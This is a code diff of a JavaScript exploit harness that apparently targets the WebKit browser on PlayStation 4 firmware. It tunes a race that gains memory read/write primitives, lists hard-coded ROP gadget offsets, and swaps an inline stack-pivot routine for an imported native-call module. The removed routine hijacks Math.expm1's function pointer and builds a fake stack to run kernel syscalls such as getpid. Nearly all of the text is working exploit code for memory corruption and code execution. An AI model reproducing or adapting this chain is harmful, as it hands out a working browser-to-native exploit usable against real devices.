@@ -4,15 +4,14 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827k";
+const BUILD_ID = "rw-20250827l";
 /** opt-in only — release triggers JSC GC; chain_poops uses ?pair=1 (default off) */
 const PROMOTE_PAIR = params.get("promote") === "1";
 /** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
 const SKIP_RW_PROOF = params.get("rwproof") !== "1";
 /** getpid only when ?native=1 — auto after primitive OOMs on PS4 (96MB carrier still pinned) */
 const AUTO_NATIVE = params.get("native") === "1";
-const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
-const SYS_GETPID = 20;
+const RESTORE_LOG = params.get("restorelog") === "1";
 const HW_GADGETS_1352 = {
     wk_POP_RDI_RET: 0x4be55,
     wk_POP_RSI_RET: 0x7acb3,
@@ -40,16 +39,16 @@ const SS_LOG = "wk-rw-log";
 const SS_STATE = "wk-rw-state";
 const SS_LOG_BUILD = "wk-rw-log-build";
 /** Only persist milestones — not every ATTEMPT line (sessionStorage churn OOMs) */
-const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|BOOT|RUN-START|START-LITE|ERROR|FAIL|PROMOTE|TRIM|YIELD|SWEEP|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|SCOPE|ATTEMPTS|NOTE|RESTORED|LAST)/;
-const RENDER_EAGER = /^(PRIMITIVE|PAIR|NATIVE|BOOT|RUN-START|START-LITE|ERROR|FAIL|PASS|GIVE-UP|ATTEMPT-START|READ-PRIMITIVE|PRIMITIVE-OK|LOAD|UA-FW|LOG-CLEAR)/;
+const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|BOOT|START-LITE|ERROR|FAIL|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE)/;
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
 let persistBuf = null;
+let raceMode = false;
+const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnRefresh, btnNative, btnPeek, btnClear;
 let nativeChain = null;
-let trimDebrisFn = null;
 let nativeAllowed = false;
 
 function $(id) { return document.getElementById(id); }
@@ -119,19 +118,47 @@ function restorePersistedLog() {
     }
 }
 
+function flushPersistMilestones() {
+    try {
+        persistBuf = [];
+        for (let i = 0; i < lines.length; i++) {
+            const line = lines[i];
+            const tag = line.split(/\s/)[0];
+            if (PERSIST_TAGS.test(tag)) persistBuf.push(line);
+        }
+        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
+        if (persistBuf.length)
+            sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
+        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
+    } catch (_) { }
+}
+
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
+    if (raceMode) {
+        raceBuf.push(line);
+        if (raceBuf.length > 48) raceBuf.shift();
+        if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag)) {
+            lines.push(line);
+            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
+            if (outEl) {
+                outEl.textContent = lines.join("\n");
+                outEl.scrollTop = outEl.scrollHeight;
+            }
+        }
+        return;
+    }
     lines.push(line);
     if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
     persistLine(tag, line);
-    if (RENDER_EAGER.test(tag) || !busy || (lines.length & 15) === 0) renderOut();
+    renderOut();
 }
 
 function state(msg, cls) {
     if (!stateEl) return;
     stateEl.textContent = msg;
     stateEl.className = cls || "";
-    persistState(msg, cls);
+    if (!raceMode) persistState(msg, cls);
 }
 
 function setUi() {
@@ -328,121 +355,6 @@ function resolveLibkernelBase(p, off, webkitBase) {
     return errorFn.sub32(off.k__error);
 }
 
-function putDv(dv, at, v) {
-    if (typeof v === "number") {
-        dv.setUint32(at, v >>> 0, true);
-        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
-    } else {
-        dv.setUint32(at, v.low >>> 0, true);
-        dv.setUint32(at + 4, v.hi >>> 0, true);
-    }
-}
-
-function abBacking(p, off, ab) {
-    const c = p.leakval(ab);
-    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
-        .add32(off.wk_ArrayBuffer_m_contents_m_data));
-}
-
-/** Inline poops pivot — no dynamic import (import was OOMing on PS4) */
-function armNativePivot(p, off, webkitBase, libkernelBase) {
-    const mfn = off.wk_JSFunction_m_function || 0x28;
-    const pivotSp = off.pivot_view_sp != null ? off.pivot_view_sp : 0x38;
-    const pbSize = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
-    const stubOff = off.k_stubs && off.k_stubs[SYS_GETPID];
-    if (stubOff == null) throw new Error("no getpid stub offset");
-
-    const G = {
-        POP_RDI: webkitBase.add32(off.wk_POP_RDI_RET),
-        POP_RSI: webkitBase.add32(off.wk_POP_RSI_RET),
-        POP_RDX: webkitBase.add32(off.wk_POP_RDX_RET),
-        POP_RCX: webkitBase.add32(off.wk_POP_RCX_RET),
-        POP_R8:  webkitBase.add32(off.wk_POP_R8_RET),
-        POP_R9:  webkitBase.add32(off.wk_POP_R9_RET),
-        POP_RAX: webkitBase.add32(off.wk_POP_RAX_RET),
-        LEAVE:   webkitBase.add32(off.wk_LEAVE_RET),
-        MOV_RDI_RAX: webkitBase.add32(off.wk_MOV_QWORD_PTR_RDI_RAX_RET),
-        G0: webkitBase.add32(off.wk_MOV_RDI_RSI_30_CALL),
-        G1: webkitBase.add32(off.wk_POP_RAX_MOV_RAX_JMP_18),
-        G2: webkitBase.add32(off.wk_PUSH_RBP_MOV_RBP_RSP_10),
-        G3: webkitBase.add32(off.wk_MOV_RDI_RAX_8_CALL_20),
-        G4: webkitBase.add32(off.wk_MOV_RDX_RAX_18_CALL_10),
-        G5: webkitBase.add32(off.wk_PUSH_RDX_POP_RSP_RET),
-    };
-    const getpidStub = libkernelBase.add32(stubOff);
-    const argGadget = [G.POP_RDI, G.POP_RSI, G.POP_RDX, G.POP_RCX, G.POP_R8, G.POP_R9];
-
-    const sb = new ArrayBuffer(0x20);
-    const pb = new ArrayBuffer(pbSize);
-    const kb = new ArrayBuffer(0x2000);
-    const fb = new ArrayBuffer(0x40);
-    const storeDv = new DataView(sb);
-    const pivotDv = new DataView(pb);
-    const stackDv = new DataView(kb);
-    const frameDv = new DataView(fb);
-    const stackU8 = new Uint8Array(kb);
-    const frameU8 = new Uint8Array(fb);
-
-    const S = abBacking(p, off, sb);
-    const P = abBacking(p, off, pb);
-    const K = abBacking(p, off, kb);
-    const F = abBacking(p, off, fb);
-
-    putDv(storeDv, 0x00, G.G1);
-    putDv(storeDv, 0x08, P);
-    putDv(storeDv, 0x10, G.G3);
-    putDv(storeDv, 0x18, G.G2);
-    putDv(pivotDv, 0x00, P);
-    putDv(pivotDv, 0x10, G.G5);
-    putDv(pivotDv, 0x20, G.G4);
-
-    function layoutCall(target, args) {
-        stackU8.fill(0);
-        frameU8.fill(0);
-        const insts = [];
-        const n = args ? args.length : 0;
-        for (let i = 0; i < n; i++) {
-            insts.push(argGadget[i]);
-            insts.push(args[i]);
-        }
-        const targetIdx = insts.length;
-        insts.push(target);
-        insts.push(G.POP_RDI);
-        insts.push(F);
-        insts.push(G.MOV_RDI_RAX);
-        insts.push(G.POP_RAX);
-        insts.push(JSVALUE_UNDEFINED);
-        insts.push(G.LEAVE);
-        let at = 0x2000 - 8 * insts.length;
-        if (((K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
-        for (let i = 0; i < insts.length; i++)
-            putDv(stackDv, at + 8 * i, insts[i]);
-        putDv(pivotDv, pivotSp, K.add32(at));
-    }
-
-    const expm1Cell = p.leakval(Math.expm1);
-    const mainMf = p.read8(p.read8(expm1Cell.add32(0x18)).add32(mfn));
-    const mainOrig = p.read8(mainMf);
-    const pivotObj = {};
-    const pivotCell = p.leakval(pivotObj);
-    p.write8(mainMf, G.G0);
-
-    return {
-        libkernelBase,
-        getpid() {
-            layoutCall(getpidStub, []);
-            const saved = p.read8(pivotCell);
-            p.write8(pivotCell, S);
-            Math.expm1(pivotObj);
-            p.write8(pivotCell, saved);
-            return frameDv.getUint32(0, true) | 0;
-        },
-        disarm() {
-            try { p.write8(mainMf, mainOrig); } catch (_) { }
-        },
-    };
-}
-
 function stripUiForNative() {
     for (const id of ["groom-bar", "peek-bar", "hint", "map"]) {
         const el = document.getElementById(id);
@@ -469,7 +381,7 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-function doNativeCallImmediate() {
+async function doNativeCallImmediate() {
     if (!nativeAllowed) {
         mark("NATIVE-FAIL", "window.p broken — reload");
         state("native blocked", "bad");
@@ -493,13 +405,21 @@ function doNativeCallImmediate() {
     }
     mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
         + " promoted=" + pairStatus.promoted);
-    const chain = armNativePivot(p, off, webkitBase, libkernelBase);
+    const { initNativeCall } = await import("./native_call.js");
+    const chain = initNativeCall(p, off, {
+        webkitBase,
+        nativeFn,
+        log: () => {},
+        trust: true,
+        noStubScan: true,
+        getpidOnly: true,
+    });
     nativeChain = chain;
     try {
         sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
     } catch (_) { }
     mark("NATIVE-CALL", "getpid… build=" + BUILD_ID);
-    const pid = chain.getpid();
+    const pid = chain.sc(20).i32;
     if (pid > 0) {
         mark("NATIVE-OK", "getpid=" + pid);
         state("native call OK pid=" + pid, "ok");
@@ -533,7 +453,7 @@ async function runNativeCall() {
     setUi();
     try {
         await freeBeforeNative();
-        doNativeCallImmediate();
+        await doNativeCallImmediate();
     } catch (err) {
         if (nativeChain) {
             try { nativeChain.disarm(); } catch (_) { }
@@ -551,11 +471,9 @@ async function loadExploit() {
     if (exploit) return exploit;
     mark("LOAD", "core.js + mem.js");
     const core = await import("./core.js");
-    trimDebrisFn = core.trimExploitDebris;
     exploit = {
         establishPrimitive: core.establishPrimitive,
         installWindowP,
-        trimExploitDebris: core.trimExploitDebris,
     };
     return exploit;
 }
@@ -590,15 +508,33 @@ function onRaceEvent(tag, detail) {
 async function establishOnce(establishPrimitive) {
     raceAttempt = 0;
     lengthMissStreak = 0;
+    raceBuf.length = 0;
+    raceMode = true;
     const cap = attemptCap();
-    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
-    mark("NOTE", "pinned groom profile — skipTrimDebris (TRIM-DEBRIS OOMs on PS4)");
-
-    return establishPrimitive({
-        maxAttempts: cap,
-        skipTrimDebris: true,
-        onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
-    });
+    try {
+        return await establishPrimitive({
+            maxAttempts: cap,
+            skipTrimDebris: true,
+            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
+        });
+    } finally {
+        raceMode = false;
+        for (let i = 0; i < raceBuf.length; i++) {
+            const line = raceBuf[i];
+            const tag = line.split(/\s/)[0];
+            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
+                let dup = false;
+                for (let j = 0; j < lines.length; j++) {
+                    if (lines[j] === line) { dup = true; break; }
+                }
+                if (!dup) lines.push(line);
+            }
+        }
+        raceBuf.length = 0;
+        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
+        flushPersistMilestones();
+        renderOut();
+    }
 }
 
 function bufAddr(p, off, ab) {
@@ -668,13 +604,16 @@ async function runStart() {
     if (busy || ready) return;
     busy = true;
     setUi();
-    mark("RUN-START", "build=" + BUILD_ID);
+    lines.length = 0;
+    raceBuf.length = 0;
+    if (RESTORE_LOG) restorePersistedLog();
+    else clearPersistedLog();
+    if (outEl) outEl.textContent = "";
     pointers.length = 0;
     renderMap();
 
     const detected = offsetsFor(navigator.userAgent);
     mark("UA-FW", detected.key || "unknown");
-    mark("SCOPE", "WebKit browser process — not full OS process list");
     state("getting primitive…", "warn");
 
     try {
@@ -711,7 +650,7 @@ async function runStart() {
             ready = true;
             state("primitive OK — tap Native call (?native=1 auto)", "ok");
             if (AUTO_NATIVE && nativeAllowed) {
-                try { doNativeCallImmediate(); }
+                try { await doNativeCallImmediate(); }
                 catch (err) {
                     if (nativeChain) {
                         try { nativeChain.disarm(); } catch (_) { }
@@ -812,12 +751,11 @@ function init() {
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
-    else if (restorePersistedLog()) renderOut();
+    else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — skipTrimDebris (pinned groom, chain_poops profile)");
-    mark("BOOT", "promote=" + PROMOTE_PAIR + " (opt-in ?promote=1) auto-native=" + AUTO_NATIVE);
+    mark("BOOT", "build=" + BUILD_ID + " — cal-lean race (no log IO during primitive)");
+    mark("BOOT", "skipTrimDebris + ?restorelog=1 after OOM to read saved log");
     mark("BOOT", groomBootLine(params));
-    mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
     window.addEventListener("beforeunload", function () {
         if (stateEl) persistState(stateEl.textContent, stateEl.className);
         if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
